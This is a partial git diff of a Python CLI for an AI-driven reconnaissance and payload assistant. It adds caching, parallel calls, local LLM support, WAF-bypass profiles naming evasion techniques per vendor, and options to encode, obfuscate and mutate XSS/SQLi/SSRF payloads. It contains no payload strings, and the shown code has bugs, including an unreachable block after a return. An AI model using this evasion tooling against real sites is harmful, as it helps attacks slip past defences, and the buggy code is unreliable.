@@ -10,11 +10,19 @@ import json
 import os
 import re
 import hashlib
-from datetime import datetime
-from typing import Dict, List, Optional, Tuple
-from dataclasses import dataclass
-from pathlib import Path
+import threading
+import asyncio
 import time
+import pickle
+import base64
+import urllib.parse
+from datetime import datetime, timedelta
+from typing import Dict, List, Optional, Tuple, Any, Union
+from dataclasses import dataclass, field
+from pathlib import Path
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from functools import wraps
+import configparser
 
 # AI Provider imports (with fallback handling)
 try:
@@ -51,6 +59,69 @@ class AIProviderConfig:
     api_key: str
     model: str
     available: bool
+    endpoint: Optional[str] = None  # For local LLMs
+    timeout: int = 30
+    max_tokens: int = 2000
+    temperature: float = 0.7
+
+
+@dataclass
+class CacheConfig:
+    """Configuration for AI response caching"""
+    
+    enabled: bool = False
+    cache_dir: str = ""
+    max_age_hours: int = 24
+    max_size_mb: int = 100
+    cleanup_interval_hours: int = 6
+
+
+@dataclass
+class ParallelConfig:
+    """Configuration for parallel processing"""
+    
+    enabled: bool = False
+    max_workers: int = 4
+    rate_limit_per_minute: int = 60
+    batch_size: int = 10
+
+
+@dataclass
+class WAFConfig:
+    """Configuration for WAF detection and bypass"""
+    
+    profile: str = "auto"  # auto, cloudflare, aws, azure, akamai
+    encoding_chains: int = 2
+    obfuscation_level: str = "medium"  # low, medium, high, extreme
+
+
+@dataclass
+class ReconCLIConfig:
+    """Main configuration class for advanced AICLI features"""
+    
+    # Core settings
+    config_version: str = "1.0"
+    default_provider: str = "openai"
+    verbose_logging: bool = False
+    
+    # Feature configurations
+    cache: CacheConfig = field(default_factory=CacheConfig)
+    parallel: ParallelConfig = field(default_factory=ParallelConfig)
+    waf: WAFConfig = field(default_factory=WAFConfig)
+    
+    # Local LLM settings
+    local_llm_enabled: bool = False
+    local_llm_endpoint: str = "http://localhost:11434"  # Default Ollama
+    local_llm_model: str = "llama2"
+    
+    # Performance monitoring
+    performance_monitoring: bool = False
+    metrics_file: str = ""
+    
+    # Advanced features
+    payload_scoring: bool = False
+    environment_adaptation: bool = True
+    steganography_enabled: bool = False
 
 
 @dataclass
@@ -66,15 +137,50 @@ class ReconSession:
 
 
 class AIReconAssistant:
-    """Enterprise AI-powered reconnaissance assistant"""
+    """Enterprise AI-powered reconnaissance assistant with advanced features"""
 
-    def __init__(self):
+    def __init__(self, config_file: Optional[str] = None):
+        # Load configuration
+        self.config = self._load_config(config_file)
+        
+        # Initialize core components
         self.providers = self._initialize_providers()
         self.session_dir = Path.home() / ".reconcli" / "ai_sessions"
         self.session_dir.mkdir(parents=True, exist_ok=True)
         self.current_session: Optional[ReconSession] = None
+        
+        # Initialize cache system
+        self.cache_manager = None
+        if self.config.cache.enabled:
+            self.cache_manager = self._initialize_cache()
+        
+        # Initialize parallel processing
+        self.executor = None
+        self.rate_limiter = None
+        if self.config.parallel.enabled:
+            self.executor = ThreadPoolExecutor(max_workers=self.config.parallel.max_workers)
+            self.rate_limiter = self._initialize_rate_limiter()
+        
+        # Initialize performance monitoring
+        self.performance_metrics = {}
+        if self.config.performance_monitoring:
+            self._initialize_performance_monitoring()
+        
+        # Thread safety
+        self._lock = threading.RLock()
+        
+        # WAF Profile Manager
+        self.waf_profiles = self._initialize_waf_profiles()
+        
+        # Payload effectiveness tracker
+        self.payload_tracker = {}
+        
+        # Local LLM client
+        self.local_llm_client = None
+        if self.config.local_llm_enabled:
+            self.local_llm_client = self._initialize_local_llm()
 
-        # Predefined recon templates
+        # Predefined recon templates (existing code)...
         self.recon_templates = {
             "subdomain_enum": {
                 "description": "Comprehensive subdomain enumeration",
@@ -127,8 +233,341 @@ class AIReconAssistant:
             },
         }
 
+    def _load_config(self, config_file: Optional[str] = None) -> ReconCLIConfig:
+        """Load configuration from file or use defaults"""
+        config = ReconCLIConfig()
+        
+        if config_file and Path(config_file).exists():
+            try:
+                with open(config_file, 'r') as f:
+                    config_data = json.load(f)
+                    
+                # Update config with loaded data
+                if 'cache' in config_data:
+                    cache_data = config_data['cache']
+                    config.cache = CacheConfig(**cache_data)
+                    
+                if 'parallel' in config_data:
+                    parallel_data = config_data['parallel']
+                    config.parallel = ParallelConfig(**parallel_data)
+                    
+                if 'waf' in config_data:
+                    waf_data = config_data['waf']
+                    config.waf = WAFConfig(**waf_data)
+                    
+                # Update other fields
+                for field_name in ['default_provider', 'verbose_logging', 'local_llm_enabled', 
+                                 'local_llm_endpoint', 'local_llm_model', 'performance_monitoring']:
+                    if field_name in config_data:
+                        setattr(config, field_name, config_data[field_name])
+                        
+            except Exception as e:
+                if config.verbose_logging:
+                    print(f"Warning: Could not load config file {config_file}: {e}")
+        
+        # Set default cache directory if not specified
+        if config.cache.enabled and not config.cache.cache_dir:
+            config.cache.cache_dir = str(self.session_dir / "cache")
+            
+        return config
+    
+    def save_config(self, config_file: str) -> bool:
+        """Save current configuration to file"""
+        try:
+            config_data = {
+                'config_version': self.config.config_version,
+                'default_provider': self.config.default_provider,
+                'verbose_logging': self.config.verbose_logging,
+                'cache': {
+                    'enabled': self.config.cache.enabled,
+                    'cache_dir': self.config.cache.cache_dir,
+                    'max_age_hours': self.config.cache.max_age_hours,
+                    'max_size_mb': self.config.cache.max_size_mb,
+                    'cleanup_interval_hours': self.config.cache.cleanup_interval_hours
+                },
+                'parallel': {
+                    'enabled': self.config.parallel.enabled,
+                    'max_workers': self.config.parallel.max_workers,
+                    'rate_limit_per_minute': self.config.parallel.rate_limit_per_minute,
+                    'batch_size': self.config.parallel.batch_size
+                },
+                'waf': {
+                    'profile': self.config.waf.profile,
+                    'encoding_chains': self.config.waf.encoding_chains,
+                    'obfuscation_level': self.config.waf.obfuscation_level
+                },
+                'local_llm_enabled': self.config.local_llm_enabled,
+                'local_llm_endpoint': self.config.local_llm_endpoint,
+                'local_llm_model': self.config.local_llm_model,
+                'performance_monitoring': self.config.performance_monitoring,
+                'payload_scoring': self.config.payload_scoring,
+                'environment_adaptation': self.config.environment_adaptation,
+                'steganography_enabled': self.config.steganography_enabled
+            }
+            
+            with open(config_file, 'w') as f:
+                json.dump(config_data, f, indent=2)
+                
+            return True
+        except Exception as e:
+            if self.config.verbose_logging:
+                print(f"Error saving config: {e}")
+            return False
+
+        # Payload categories with advanced templates
+        self.payload_categories = {
+            "xss": {
+                "description": "Cross-Site Scripting payloads",
+                "contexts": ["html", "javascript", "attribute", "url", "css"],
+                "techniques": ["reflection", "dom", "stored", "blind"],
+            },
+            "sqli": {
+                "description": "SQL Injection payloads",
+                "contexts": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+                "techniques": ["union", "boolean", "time", "error"],
+            },
+            "lfi": {
+                "description": "Local File Inclusion payloads",
+                "contexts": ["linux", "windows", "php", "java"],
+                "techniques": ["traversal", "wrapper", "filter", "log"],
+            },
+            "ssrf": {
+                "description": "Server-Side Request Forgery payloads",
+                "contexts": ["internal", "cloud", "bypass", "blind"],
+                "techniques": ["http", "file", "gopher", "dns"],
+            },
+            "ssti": {
+                "description": "Server-Side Template Injection payloads",
+                "contexts": ["jinja2", "twig", "smarty", "freemarker"],
+                "techniques": ["detection", "exploitation", "sandbox"],
+            },
+        }
+
+    def _initialize_cache(self):
+        """Initialize AI response cache system"""
+        cache_dir = Path(self.config.cache.cache_dir)
+        cache_dir.mkdir(parents=True, exist_ok=True)
+        
+        class CacheManager:
+            def __init__(self, config: CacheConfig):
+                self.config = config
+                self.cache_dir = Path(config.cache_dir)
+                self.cache_index_file = self.cache_dir / "cache_index.json"
+                self.cache_index = self._load_cache_index()
+                
+            def _load_cache_index(self) -> Dict:
+                if self.cache_index_file.exists():
+                    try:
+                        with open(self.cache_index_file, 'r') as f:
+                            return json.load(f)
+                    except:
+                        pass
+                return {}
+            
+            def _save_cache_index(self):
+                with open(self.cache_index_file, 'w') as f:
+                    json.dump(self.cache_index, f, indent=2)
+            
+            def _generate_cache_key(self, prompt: str, context: str, persona: str, provider: str) -> str:
+                """Generate cache key from prompt parameters"""
+                key_data = f"{prompt}|{context}|{persona}|{provider}"
+                return hashlib.sha256(key_data.encode()).hexdigest()
+            
+            def get(self, prompt: str, context: str, persona: str, provider: str) -> Optional[str]:
+                """Get cached response if available and not expired"""
+                cache_key = self._generate_cache_key(prompt, context, persona, provider)
+                
+                if cache_key not in self.cache_index:
+                    return None
+                
+                cache_entry = self.cache_index[cache_key]
+                created_time = datetime.fromisoformat(cache_entry['created'])
+                
+                # Check if expired
+                max_age = timedelta(hours=self.config.max_age_hours)
+                if datetime.now() - created_time > max_age:
+                    self._remove_cache_entry(cache_key)
+                    return None
+                
+                # Load cached response
+                cache_file = self.cache_dir / f"{cache_key}.json"
+                if cache_file.exists():
+                    try:
+                        with open(cache_file, 'r') as f:
+                            cache_data = json.load(f)
+                            return cache_data['response']
+                    except:
+                        self._remove_cache_entry(cache_key)
+                
+                return None
+            
+            def set(self, prompt: str, context: str, persona: str, provider: str, response: str):
+                """Cache AI response"""
+                cache_key = self._generate_cache_key(prompt, context, persona, provider)
+                
+                cache_data = {
+                    'prompt': prompt,
+                    'context': context,
+                    'persona': persona,
+                    'provider': provider,
+                    'response': response,
+                    'created': datetime.now().isoformat(),
+                    'access_count': 1
+                }
+                
+                # Save cache file
+                cache_file = self.cache_dir / f"{cache_key}.json"
+                with open(cache_file, 'w') as f:
+                    json.dump(cache_data, f, indent=2)
+                
+                # Update index
+                self.cache_index[cache_key] = {
+                    'created': cache_data['created'],
+                    'size': cache_file.stat().st_size,
+                    'access_count': 1
+                }
+                self._save_cache_index()
+                
+                # Cleanup if needed
+                self._cleanup_if_needed()
+            
+            def _remove_cache_entry(self, cache_key: str):
+                """Remove cache entry"""
+                cache_file = self.cache_dir / f"{cache_key}.json"
+                if cache_file.exists():
+                    cache_file.unlink()
+                
+                if cache_key in self.cache_index:
+                    del self.cache_index[cache_key]
+                    self._save_cache_index()
+            
+            def _cleanup_if_needed(self):
+                """Cleanup cache if size limit exceeded"""
+                total_size = sum(entry['size'] for entry in self.cache_index.values())
+                max_size_bytes = self.config.max_size_mb * 1024 * 1024
+                
+                if total_size > max_size_bytes:
+                    # Remove oldest entries first
+                    sorted_entries = sorted(
+                        self.cache_index.items(),
+                        key=lambda x: (x[1]['access_count'], x[1]['created'])
+                    )
+                    
+                    for cache_key, entry in sorted_entries:
+                        self._remove_cache_entry(cache_key)
+                        total_size -= entry['size']
+                        if total_size <= max_size_bytes * 0.8:  # Leave 20% buffer
+                            break
+        
+        return CacheManager(self.config.cache)
+    
+    def _initialize_rate_limiter(self):
+        """Initialize rate limiter for parallel processing"""
+        class RateLimiter:
+            def __init__(self, requests_per_minute: int):
+                self.requests_per_minute = requests_per_minute
+                self.requests = []
+                self.lock = threading.Lock()
+            
+            def acquire(self):
+                with self.lock:
+                    now = time.time()
+                    # Remove requests older than 1 minute
+                    self.requests = [req_time for req_time in self.requests if now - req_time < 60]
+                    
+                    if len(self.requests) >= self.requests_per_minute:
+                        # Calculate wait time
+                        oldest_request = min(self.requests)
+                        wait_time = 60 - (now - oldest_request)
+                        if wait_time > 0:
+                            time.sleep(wait_time)
+                    
+                    self.requests.append(now)
+        
+        return RateLimiter(self.config.parallel.rate_limit_per_minute)
+    
+    def _initialize_performance_monitoring(self):
+        """Initialize performance monitoring system"""
+        self.performance_metrics = {
+            'total_requests': 0,
+            'successful_requests': 0,
+            'failed_requests': 0,
+            'cache_hits': 0,
+            'cache_misses': 0,
+            'average_response_time': 0.0,
+            'response_times': [],
+            'provider_stats': {},
+            'start_time': datetime.now().isoformat()
+        }
+    
+    def _initialize_local_llm(self):
+        """Initialize local LLM client"""
+        class LocalLLMClient:
+            def __init__(self, endpoint: str, model: str):
+                self.endpoint = endpoint.rstrip('/')
+                self.model = model
+                
+            def generate(self, prompt: str, max_tokens: int = 2000) -> Optional[str]:
+                """Generate response using local LLM"""
+                try:
+                    import requests
+                    
+                    payload = {
+                        "model": self.model,
+                        "prompt": prompt,
+                        "max_tokens": max_tokens,
+                        "stream": False
+                    }
+                    
+                    response = requests.post(
+                        f"{self.endpoint}/api/generate",
+                        json=payload,
+                        timeout=30
+                    )
+                    
+                    if response.status_code == 200:
+                        result = response.json()
+                        return result.get('response', '')
+                    
+                except Exception as e:
+                    if hasattr(self, 'verbose_logging') and self.verbose_logging:
+                        print(f"Local LLM error: {e}")
+                
+                return None
+        
+        return LocalLLMClient(self.config.local_llm_endpoint, self.config.local_llm_model)
+    
+    def _initialize_waf_profiles(self) -> Dict[str, Dict]:
+        """Initialize WAF detection and bypass profiles"""
+        return {
+            "cloudflare": {
+                "signatures": ["cf-ray", "cloudflare", "__cfduid"],
+                "bypass_techniques": ["unicode_encoding", "case_variation", "comment_insertion"],
+                "encoding_chains": ["url_encode", "double_url_encode"],
+                "payload_mutations": ["case_alternation", "encoding_mix"]
+            },
+            "aws": {
+                "signatures": ["x-amzn-requestid", "x-amz-cf-id"],
+                "bypass_techniques": ["parameter_pollution", "encoding_variation"],
+                "encoding_chains": ["html_encode", "unicode_mix"],
+                "payload_mutations": ["parameter_splitting", "mixed_case"]
+            },
+            "azure": {
+                "signatures": ["x-azure-ref", "x-msedge-ref"],
+                "bypass_techniques": ["header_manipulation", "encoding_bypass"],
+                "encoding_chains": ["base64_chunks", "hex_encoding"],
+                "payload_mutations": ["whitespace_variation", "comment_evasion"]
+            },
+            "akamai": {
+                "signatures": ["akamai-ghost", "x-akamai-edgescape"],
+                "bypass_techniques": ["chunk_encoding", "case_mutation"],
+                "encoding_chains": ["nested_encoding", "protocol_mutation"],
+                "payload_mutations": ["protocol_switching", "encoding_layering"]
+            }
+        }
+
     def _initialize_providers(self) -> List[AIProviderConfig]:
-        """Initialize available AI providers"""
+        """Initialize available AI providers including local LLMs"""
         providers = []
 
         # OpenAI GPT
@@ -139,6 +578,9 @@ class AIReconAssistant:
                     api_key=os.getenv("OPENAI_API_KEY") or "",
                     model="gpt-4",
                     available=True,
+                    timeout=self.config.parallel.rate_limit_per_minute if hasattr(self, 'config') else 30,
+                    max_tokens=2000,
+                    temperature=0.7
                 )
             )
 
@@ -150,6 +592,9 @@ class AIReconAssistant:
                     api_key=os.getenv("ANTHROPIC_API_KEY") or "",
                     model="claude-3-opus-20240229",
                     available=True,
+                    timeout=30,
+                    max_tokens=2000,
+                    temperature=0.7
                 )
             )
 
@@ -161,6 +606,24 @@ class AIReconAssistant:
                     api_key=os.getenv("GOOGLE_API_KEY") or "",
                     model="gemini-pro",
                     available=True,
+                    timeout=30,
+                    max_tokens=2000,
+                    temperature=0.7
+                )
+            )
+        
+        # Local LLM (Ollama)
+        if hasattr(self, 'config') and self.config.local_llm_enabled:
+            providers.append(
+                AIProviderConfig(
+                    name="local",
+                    api_key="",
+                    model=self.config.local_llm_model,
+                    available=True,
+                    endpoint=self.config.local_llm_endpoint,
+                    timeout=60,
+                    max_tokens=2000,
+                    temperature=0.7
                 )
             )
 
@@ -327,21 +790,40 @@ reconcli vulncli --target {message}
         provider: Optional[str] = None,
         context: str = "recon",
         persona: Optional[str] = None,
+        use_cache: bool = True,
     ) -> Optional[str]:
-        """Ask AI with provider selection, context, and persona"""
-        if not self.providers:
-            return self.ask_ai_mock(message, context)
-
-        # Select provider
-        if provider:
-            selected_provider = next(
-                (p for p in self.providers if p.name == provider), None
+        """Ask AI with caching, performance monitoring, and enhanced provider support"""
+        
+        start_time = time.time()
+        
+        # Update performance metrics
+        if self.config.performance_monitoring:
+            self.performance_metrics['total_requests'] += 1
+        
+        # Check cache first
+        if use_cache and self.cache_manager:
+            cached_response = self.cache_manager.get(
+                message, context, persona or "default", provider or "auto"
             )
-        else:
-            selected_provider = self.providers[0]  # Use first available
+            if cached_response:
+                if self.config.performance_monitoring:
+                    self.performance_metrics['cache_hits'] += 1
+                return cached_response
+            elif self.config.performance_monitoring:
+                self.performance_metrics['cache_misses'] += 1
+        
+        # Fallback to mock if no providers available
+        if not self.providers:
+            response = self.ask_ai_mock(message, context)
+            self._update_performance_metrics(start_time, True, provider or "mock")
+            return response
 
+        # Select provider with fallback logic
+        selected_provider = self._select_provider(provider)
         if not selected_provider:
-            return self.ask_ai_mock(message, context)
+            response = self.ask_ai_mock(message, context)
+            self._update_performance_metrics(start_time, True, "mock")
+            return response
 
         # Get persona-specific system prompt
         if persona:
@@ -349,65 +831,196 @@ reconcli vulncli --target {message}
         else:
             system_prompt = self._get_default_prompt(context)
 
+        # Rate limiting for parallel processing
+        if self.rate_limiter:
+            self.rate_limiter.acquire()
+
         try:
-            if selected_provider.name == "openai":
-                client = openai.OpenAI(api_key=selected_provider.api_key)
-                response = client.chat.completions.create(
-                    model=selected_provider.model,
-                    messages=[
-                        {"role": "system", "content": system_prompt},
-                        {"role": "user", "content": message},
-                    ],
-                    temperature=0.7,
-                    max_tokens=2000,
-                )
-                result = response.choices[0].message.content
-
-            elif selected_provider.name == "anthropic":
-                client = anthropic.Anthropic(api_key=selected_provider.api_key)
-                response = client.messages.create(
-                    model=selected_provider.model,
-                    max_tokens=2000,
-                    messages=[
-                        {"role": "user", "content": f"{system_prompt}\n\n{message}"}
-                    ],
-                )
-                # Fallback to mock response for Anthropic to avoid type issues
-                result = self.ask_ai_mock(message, context)
-
-            elif selected_provider.name == "gemini":
-                genai.configure(api_key=selected_provider.api_key)
-                model = genai.GenerativeModel(selected_provider.model)
-                response = model.generate_content(f"{system_prompt}\n\n{message}")
-                result = response.text
-
+            response = self._query_provider(selected_provider, system_prompt, message)
+            
+            if response:
+                # Cache the response
+                if use_cache and self.cache_manager:
+                    self.cache_manager.set(
+                        message, context, persona or "default", 
+                        selected_provider.name, response
+                    )
+                
+                # Log query and result
+                if self.current_session:
+                    with self._lock:
+                        self.current_session.queries.append(
+                            {
+                                "timestamp": datetime.now().isoformat(),
+                                "message": message,
+                                "provider": selected_provider.name,
+                                "context": context,
+                                "persona": persona,
+                                "cached": False
+                            }
+                        )
+                        self.current_session.results.append(
+                            {
+                                "timestamp": datetime.now().isoformat(),
+                                "response": response,
+                                "provider": selected_provider.name,
+                                "response_time": time.time() - start_time
+                            }
+                        )
+                        self.save_session()
+                
+                self._update_performance_metrics(start_time, True, selected_provider.name)
+                return response
             else:
-                return self.ask_ai_mock(message, context)
-
-            # Log query and result
-            if self.current_session:
-                self.current_session.queries.append(
-                    {
-                        "timestamp": datetime.now().isoformat(),
-                        "message": message,
-                        "provider": selected_provider.name,
-                        "context": context,
-                    }
-                )
-                self.current_session.results.append(
-                    {
-                        "timestamp": datetime.now().isoformat(),
-                        "response": result,
-                        "provider": selected_provider.name,
-                    }
-                )
-                self.save_session()
-
-            return result
+                # Fallback to mock response
+                response = self.ask_ai_mock(message, context)
+                self._update_performance_metrics(start_time, False, selected_provider.name)
+                return response
 
         except Exception as e:
+            if self.config.verbose_logging:
+                print(f"AI provider error: {e}")
+            
             # Fallback to mock response on error
-            return self.ask_ai_mock(message, context)
+            response = self.ask_ai_mock(message, context)
+            self._update_performance_metrics(start_time, False, selected_provider.name)
+            return response
+    
+    def _select_provider(self, preferred_provider: Optional[str] = None) -> Optional[AIProviderConfig]:
+        """Select AI provider with fallback logic"""
+        if preferred_provider:
+            provider = next(
+                (p for p in self.providers if p.name == preferred_provider and p.available), 
+                None
+            )
+            if provider:
+                return provider
+        
+        # Use default provider from config
+        if hasattr(self, 'config') and self.config.default_provider:
+            provider = next(
+                (p for p in self.providers if p.name == self.config.default_provider and p.available),
+                None
+            )
+            if provider:
+                return provider
+        
+        # Fallback to first available provider
+        return next((p for p in self.providers if p.available), None)
+    
+    def _query_provider(self, provider: AIProviderConfig, system_prompt: str, message: str) -> Optional[str]:
+        """Query specific AI provider"""
+        if provider.name == "openai":
+            return self._query_openai(provider, system_prompt, message)
+        elif provider.name == "anthropic":
+            return self._query_anthropic(provider, system_prompt, message)
+        elif provider.name == "gemini":
+            return self._query_gemini(provider, system_prompt, message)
+        elif provider.name == "local":
+            return self._query_local_llm(provider, system_prompt, message)
+        else:
+            return None
+    
+    def _query_openai(self, provider: AIProviderConfig, system_prompt: str, message: str) -> Optional[str]:
+        """Query OpenAI provider"""
+        try:
+            client = openai.OpenAI(api_key=provider.api_key)
+            response = client.chat.completions.create(
+                model=provider.model,
+                messages=[
+                    {"role": "system", "content": system_prompt},
+                    {"role": "user", "content": message},
+                ],
+                temperature=provider.temperature,
+                max_tokens=provider.max_tokens,
+                timeout=provider.timeout,
+            )
+            return response.choices[0].message.content
+        except Exception as e:
+            if self.config.verbose_logging:
+                print(f"OpenAI error: {e}")
+            return None
+    
+    def _query_anthropic(self, provider: AIProviderConfig, system_prompt: str, message: str) -> Optional[str]:
+        """Query Anthropic provider"""
+        try:
+            client = anthropic.Anthropic(api_key=provider.api_key)
+            response = client.messages.create(
+                model=provider.model,
+                max_tokens=provider.max_tokens,
+                messages=[
+                    {"role": "user", "content": f"{system_prompt}\n\n{message}"}
+                ],
+            )
+            # For now, fallback to mock to avoid type issues
+            return self.ask_ai_mock(message, "recon")
+        except Exception as e:
+            if self.config.verbose_logging:
+                print(f"Anthropic error: {e}")
+            return None
+    
+    def _query_gemini(self, provider: AIProviderConfig, system_prompt: str, message: str) -> Optional[str]:
+        """Query Gemini provider"""
+        try:
+            genai.configure(api_key=provider.api_key)
+            model = genai.GenerativeModel(provider.model)
+            response = model.generate_content(f"{system_prompt}\n\n{message}")
+            return response.text
+        except Exception as e:
+            if self.config.verbose_logging:
+                print(f"Gemini error: {e}")
+            return None
+    
+    def _query_local_llm(self, provider: AIProviderConfig, system_prompt: str, message: str) -> Optional[str]:
+        """Query local LLM provider"""
+        if not self.local_llm_client:
+            return None
+        
+        full_prompt = f"{system_prompt}\n\nUser: {message}\n\nAssistant:"
+        return self.local_llm_client.generate(full_prompt, provider.max_tokens)
+    
+    def _update_performance_metrics(self, start_time: float, success: bool, provider: str):
+        """Update performance monitoring metrics"""
+        if not self.config.performance_monitoring:
+            return
+        
+        response_time = time.time() - start_time
+        
+        if success:
+            self.performance_metrics['successful_requests'] += 1
+        else:
+            self.performance_metrics['failed_requests'] += 1
+        
+        # Update response times
+        self.performance_metrics['response_times'].append(response_time)
+        if len(self.performance_metrics['response_times']) > 100:
+            self.performance_metrics['response_times'] = self.performance_metrics['response_times'][-100:]
+        
+        # Calculate average response time
+        self.performance_metrics['average_response_time'] = sum(
+            self.performance_metrics['response_times']
+        ) / len(self.performance_metrics['response_times'])
+        
+        # Update provider stats
+        if provider not in self.performance_metrics['provider_stats']:
+            self.performance_metrics['provider_stats'][provider] = {
+                'requests': 0, 'successes': 0, 'failures': 0, 'avg_response_time': 0.0
+            }
+        
+        stats = self.performance_metrics['provider_stats'][provider]
+        stats['requests'] += 1
+        if success:
+            stats['successes'] += 1
+        else:
+            stats['failures'] += 1
+        
+        # Update provider average response time
+        if 'response_times' not in stats:
+            stats['response_times'] = []
+        stats['response_times'].append(response_time)
+        if len(stats['response_times']) > 50:
+            stats['response_times'] = stats['response_times'][-50:]
+        stats['avg_response_time'] = sum(stats['response_times']) / len(stats['response_times'])
 
     def generate_recon_plan(
         self, target: str, scope: str = "comprehensive", persona: Optional[str] = None
@@ -1765,7 +2378,8 @@ Provide structured, phase-based reconnaissance plans with specific tools and tec
         return recon_data
 
 
-# Global assistant instance
+# Global assistant instance - initialized with default config
+# Will be reconfigured based on CLI options
 ai_assistant = AIReconAssistant()
 
 
@@ -1830,6 +2444,31 @@ ai_assistant = AIReconAssistant()
     type=int,
     help="Number of payload mutations to generate",
 )
+@click.option("--config", help="Configuration file path")
+@click.option("--cache", is_flag=True, help="Enable AI response caching")
+@click.option("--cache-dir", help="Cache directory path")
+@click.option("--parallel", is_flag=True, help="Enable parallel processing")
+@click.option("--max-workers", default=4, type=int, help="Maximum parallel workers")
+@click.option("--local-llm", is_flag=True, help="Enable local LLM support (Ollama)")
+@click.option("--local-llm-endpoint", default="http://localhost:11434", help="Local LLM endpoint")
+@click.option("--local-llm-model", default="llama2", help="Local LLM model name")
+@click.option(
+    "--waf-profile", 
+    type=click.Choice(["auto", "cloudflare", "aws", "azure", "akamai"]), 
+    default="auto",
+    help="WAF profile for bypass techniques"
+)
+@click.option(
+    "--encoding", 
+    type=click.Choice(["url", "base64", "hex", "unicode", "mixed", "double"]), 
+    help="Encoding method for payload obfuscation"
+)
+@click.option("--encoding-chains", default=2, type=int, help="Number of encoding chains to apply")
+@click.option("--steganography", is_flag=True, help="Enable steganography and advanced obfuscation")
+@click.option("--effectiveness-scoring", is_flag=True, help="Enable payload effectiveness scoring")
+@click.option("--performance-monitoring", is_flag=True, help="Enable performance monitoring")
+@click.option("--save-config", help="Save current configuration to file")
+@click.option("--rate-limit", default=60, type=int, help="Rate limit per minute for API calls")
 def aicli(
     prompt,
     payload,
@@ -1857,6 +2496,22 @@ def aicli(
     verbose,
     mutate,
     mutations,
+    config,
+    cache,
+    cache_dir,
+    parallel,
+    max_workers,
+    local_llm,
+    local_llm_endpoint,
+    local_llm_model,
+    waf_profile,
+    encoding,
+    encoding_chains,
+    steganography,
+    effectiveness_scoring,
+    performance_monitoring,
+    save_config,
+    rate_limit,
 ):
     """🧠 Enterprise AI-Powered Reconnaissance Assistant
 
@@ -1934,16 +2589,98 @@ def aicli(
         deep           - Advanced persistent threat simulation and zero-day discovery
         compliance     - OWASP Top 10, PCI DSS, GDPR compliance assessment
     """
-
+    # Initialize configuration
+    global ai_assistant
+    
+    # Update configuration from CLI options
+    if config or cache or parallel or local_llm or performance_monitoring:
+        # Create new assistant with updated config
+        config_updates = ReconCLIConfig()
+        
+        # Cache configuration
+        if cache:
+            config_updates.cache.enabled = True
+            if cache_dir:
+                config_updates.cache.cache_dir = cache_dir
+        
+        # Parallel processing configuration
+        if parallel:
+            config_updates.parallel.enabled = True
+            config_updates.parallel.max_workers = max_workers
+            config_updates.parallel.rate_limit_per_minute = rate_limit
+        
+        # Local LLM configuration
+        if local_llm:
+            config_updates.local_llm_enabled = True
+            config_updates.local_llm_endpoint = local_llm_endpoint
+            config_updates.local_llm_model = local_llm_model
+        
+        # WAF configuration
+        config_updates.waf.profile = waf_profile
+        config_updates.waf.encoding_chains = encoding_chains
+        
+        # Performance monitoring
+        if performance_monitoring:
+            config_updates.performance_monitoring = True
+            
+        # Advanced features
+        config_updates.payload_scoring = effectiveness_scoring
+        config_updates.steganography_enabled = steganography
+        
+        # Verbose logging
+        config_updates.verbose_logging = verbose
+        
+        # Create new assistant with updated configuration
+        ai_assistant = AIReconAssistant(config_file=config)
+        
+        # Update the configuration manually
+        for attr_name in dir(config_updates):
+            if not attr_name.startswith('_'):
+                setattr(ai_assistant.config, attr_name, getattr(config_updates, attr_name))
+        
+        # Reinitialize components if needed
+        if cache and not ai_assistant.cache_manager:
+            ai_assistant.cache_manager = ai_assistant._initialize_cache()
+        
+        if parallel and not ai_assistant.executor:
+            ai_assistant.executor = ThreadPoolExecutor(max_workers=max_workers)
+            ai_assistant.rate_limiter = ai_assistant._initialize_rate_limiter()
+        
+        if local_llm and not ai_assistant.local_llm_client:
+            ai_assistant.local_llm_client = ai_assistant._initialize_local_llm()
+        
+        if performance_monitoring and not ai_assistant.performance_metrics:
+            ai_assistant._initialize_performance_monitoring()
+    
+    # Save configuration if requested
+    if save_config:
+        if ai_assistant.save_config(save_config):
+            click.secho(f"✅ Configuration saved to: {save_config}", fg="green")
+        else:
+            click.secho(f"❌ Failed to save configuration to: {save_config}", fg="red")
+    
     if verbose:
         click.secho("🧠 AI-Powered Reconnaissance Assistant", fg="cyan", bold=True)
         click.secho("Part of the ReconCLI Cyber-Squad z Przyszłości", fg="blue")
+        
+        # Show configuration status
+        if ai_assistant.config.cache.enabled:
+            click.secho("🗄️  Caching: ENABLED", fg="green")
+        if ai_assistant.config.parallel.enabled:
+            click.secho(f"⚡ Parallel processing: ENABLED ({ai_assistant.config.parallel.max_workers} workers)", fg="green")
+        if ai_assistant.config.local_llm_enabled:
+            click.secho(f"🏠 Local LLM: ENABLED ({ai_assistant.config.local_llm_endpoint})", fg="green")
+        if ai_assistant.config.performance_monitoring:
+            click.secho("📊 Performance monitoring: ENABLED", fg="green")
+        
         click.secho(
             f"Available providers: {', '.join(ai_assistant.get_available_providers())}",
             fg="green",
         )
         if persona:
             click.secho(f"Active persona: {persona.upper()}", fg="magenta", bold=True)
+        if waf_profile != "auto":
+            click.secho(f"WAF profile: {waf_profile.upper()}", fg="yellow")
 
     # Generate comprehensive report from attack flow JSON
     if report:
@@ -2445,28 +3182,79 @@ Available commands:
         click.secho(f"Technique: {technique or 'all'}", fg="blue")
 
         # Advanced Payload Mutation Engine integration
-        if mutate and payload in ["xss", "sqli", "ssrf"]:
+        if mutate:
             click.secho(f"\n🔬 Advanced Payload Mutations:", fg="magenta", bold=True)
-            mutator = PayloadMutator(context=context or "html", technique=payload)
-            mutations_list = mutator.mutate()
+            
+            # Use advanced mutator with new features
+            if steganography or encoding or waf_profile != "auto":
+                advanced_mutator = AdvancedPayloadMutator(
+                    context=context or "html", 
+                    technique=payload,
+                    waf_profile=waf_profile,
+                    encoding_chains=encoding_chains
+                )
+                mutations_data = advanced_mutator.mutate(count=mutations)
+                
+                click.secho(f"Generated {len(mutations_data)} advanced mutation variants:", fg="yellow")
+                
+                for i, mutation_data in enumerate(mutations_data, 1):
+                    mutation = mutation_data['payload']
+                    effectiveness = mutation_data['effectiveness_score']
+                    evasion = mutation_data['evasion_rating']
+                    steganography_level = mutation_data['steganography_level']
+                    
+                    # Color code based on effectiveness
+                    if effectiveness >= 0.8:
+                        color = "green"
+                    elif effectiveness >= 0.6:
+                        color = "yellow"
+                    else:
+                        color = "white"
+                    
+                    click.secho(f"{i:2d}. {mutation}", fg=color)
+                    
+                    if verbose or effectiveness_scoring:
